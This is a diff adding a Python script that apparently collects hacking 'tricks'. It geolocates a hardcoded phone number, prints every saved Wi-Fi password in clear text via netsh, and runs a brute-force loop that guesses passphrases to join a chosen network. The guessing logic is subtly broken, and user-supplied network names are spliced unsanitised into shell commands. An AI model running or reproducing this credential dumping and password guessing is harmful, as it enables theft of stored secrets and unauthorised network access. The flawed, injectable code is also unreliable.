@@ -1,0 +1,95 @@
+#    1.   Knowing your Phone Location
+import phonenumbers
+from phonenumbers import geocoder, geodata
+phone_number_1 = phonenumbers.parse("+254113143372")
+print("\nPhone Numbers Location")
+print(geocoder.description_for_number(phone_number_1, "en"))
+
+
+#   2.    Getting Saved WiFi Password
+import subprocess
+#lets run the command
+command = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+profiles = [i.split(":")[1][1:-1] for i in command if "All User Profile" in i]
+for i in profiles:
+    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+    try:
+        print("{:<30}| {:<}". format(i, results[0]))
+    except IndexError:
+        print("{:<30} | {:<}".format(i, ""))
+input("")
+
+
+#     3.    Connecting to a new/unsaved WiFi Connection.
+from itertools import product
+import re
+import os
+import subprocess
+#function to establish new connection
+def createNewConnection(name, SSID, password):
+    config = """<?xml version=\"1.0\"?>
+            <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+                <name>"""+name+"""</name>
+                <SSIDConfig>
+                    <SSID>
+                        <name>"""+SSID+"""</name>
+                    </SSID>
+                </SSIDConfig>
+                <connectionType>ESS</connectionType>
+                <connectionMode>auto</connectionMode>
+                <MSM>
+                    <security>
+                        <authEncryption>
+                            <authentication>WPA2PSK</authentication>
+                            <encryption>AES</encryption>
+                            <useOneX>false</useOneX>
+                        </authEncryption>
+                        <sharedKey>
+                            <keyType>passPhrase</keyType>
+                            <protected>false</protected>
+                            <keyMaterial>"""+password+"""</keyMaterial>
+                        </sharedKey>
+                    </security>
+                </MSM>
+            </WLANProfile>"""
+    command = "netsh wlan add profile filename=\"" +name+".xml\""+" interface=Wi-Fi"
+    with open(name+".xml","w") as file:
+        file.write(config)
+    os.system(command)
+
+#function to connect to a network
+def connect(name, SSID):
+    command = "netsh wlan connect name=\"" +name+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
+    os.system(command)
+#function to display available wifi networks
+def displayAvailableNetworks():
+    command ="netsh wlan show networks interface=Wi-Fi"
+    os.system(command)
+displayAvailableNetworks()
+name = input("Name of Wi-Fi: ")
+def raid():
+    chars = '0123456789'
+    charsvars = 'abcdefghijklmnopqrstuvwxyz'
+    for length in range(8,9):
+        to_attempt = product(chars, charsvars, repeat=length)
+        for attempt in to_attempt:
+            print(''.join(attempt))
+            createNewConnection(name, name,''.join(attempt))
+            connect(name, name)
+            try:
+                if re.sub(' +','',subprocess.check_output("Netsh Wlan show interfaces").decode('utf-8').split("SSID", 1)[1].split("BSSID")[0].replace(':', '').replace('\n','')) ==name:
+                    print('Connected to: '+ name)
+                    print('The WiFi password is: ' + ''.join(attempt))
+                    break
+            except Exception:
+                print('Not Connected')
+raid()
+
+# 
+
+
+
+
+
+
